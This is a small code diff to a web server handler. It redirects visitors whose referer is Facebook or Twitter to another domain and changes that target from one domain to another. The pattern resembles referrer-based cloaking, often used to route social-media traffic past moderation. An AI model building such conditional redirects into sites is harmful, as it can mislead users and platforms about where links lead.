@@ -14,6 +14,6 @@ export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://tv24h.site"+event.req.url);
+        sendRedirect(event,"https://today247.online"+event.req.url);
     }
 })
